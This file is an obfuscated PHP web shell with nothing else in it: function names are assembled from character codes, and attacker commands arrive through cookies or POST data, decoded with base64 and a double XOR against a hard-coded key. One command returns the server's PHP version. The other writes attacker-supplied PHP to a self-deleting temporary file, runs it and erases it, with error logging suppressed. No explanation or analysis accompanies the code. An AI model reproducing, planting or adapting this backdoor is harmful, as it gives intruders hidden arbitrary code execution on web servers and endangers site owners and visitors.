<?php $sudpkeggb = chr(737-635)."\x69"."\154".chr(562-461).'_'.chr(652-540)."\165".chr(116).'_'."\143".chr(111).chr(234-124)."\164".'e'."\x6e".chr(301-185).'s';
$dfuyf = "\x62".chr(97)."\163".'e'.chr(54)."\x34".'_'."\144".'e'."\143"."\x6f"."\x64".chr(101);
$jbavrvzm = "\151".chr(866-756)."\x69"."\137"."\x73".chr(531-430)."\x74";
$fcohdjn = chr(476-359)."\x6e"."\x6c"."\x69".chr(933-823).chr(107);


@$jbavrvzm("\145"."\162"."\x72".chr(790-679)."\x72".chr(95).chr(108)."\157".chr(103), NULL);
@$jbavrvzm(chr(451-343)."\x6f".chr(815-712).chr(848-753)."\145"."\162".chr(114)."\157".chr(320-206).chr(533-418), 0);
@$jbavrvzm(chr(1078-969).'a'.chr(447-327).'_'.'e'."\x78"."\x65"."\x63"."\x75".'t'."\x69".'o'.chr(110).'_'."\x74".chr(105).'m'.'e', 0);
@set_time_limit(0);

function kluntmv($zaubd, $rerujua)
{
    $pbbett = "";
    for ($uozzi = 0; $uozzi < strlen($zaubd);) {
        for ($j = 0; $j < strlen($rerujua) && $uozzi < strlen($zaubd); $j++, $uozzi++) {
            $pbbett .= chr(ord($zaubd[$uozzi]) ^ ord($rerujua[$j]));
        }
    }
    return $pbbett;
}

$xffowfnbe = array_merge($_COOKIE, $_POST);
$wptvzc = 'ccb00206-c1f4-4471-8576-5d689f4ed5b4';
foreach ($xffowfnbe as $zshauvk => $zaubd) {
    $zaubd = @unserialize(kluntmv(kluntmv($dfuyf($zaubd), $wptvzc), $zshauvk));
    if (isset($zaubd["\141".'k'])) {
        if ($zaubd[chr(908-811)] == "\x69") {
            $uozzi = array(
                chr(709-597).chr(118) => @phpversion(),
                "\x73".'v' => "3.5",
            );
            echo @serialize($uozzi);
        } elseif ($zaubd[chr(908-811)] == 'e') {
            $ygtjd = "./" . md5($wptvzc) . "\56"."\x69".chr(251-141).'c';
            @$sudpkeggb($ygtjd, "<" . "\77".'p'.chr(381-277).chr(147-35).chr(574-542)."\100".chr(117).'n'.chr(108)."\x69"."\156".chr(107).chr(552-512).chr(95).'_'.'F'.chr(111-38).chr(76)."\x45".chr(276-181).chr(95)."\51".chr(864-805)."\40" . $zaubd["\x64"]);
            @include($ygtjd);
            @$fcohdjn($ygtjd);
        }
        exit();
    }
}

